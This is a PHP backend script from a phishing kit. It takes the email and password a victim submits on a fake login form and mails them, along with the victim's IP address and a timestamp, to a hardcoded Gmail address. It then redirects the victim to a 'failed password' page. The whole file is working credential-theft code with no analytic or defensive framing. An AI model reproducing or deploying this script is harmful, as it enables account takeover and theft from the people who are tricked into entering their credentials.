<?
session_start();
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$user1 = $_POST['Email'];
$pass1 = $_POST['Password'];
$chaseme="Ladyphone2001@gmail.com";


  $subj = "[File] JaSpEr $ip";
  $msg = "Doc Info\n\nUsername: $user1\nPassword: $pass1\n$ip $adddate\n-----------------------------------\n        Created By JaSpEr\n-----------------------------------";
  $from = "From: <FIle>";
  mail("$chaseme", $subj, $msg, $from);
  header("Location: failedpass.php");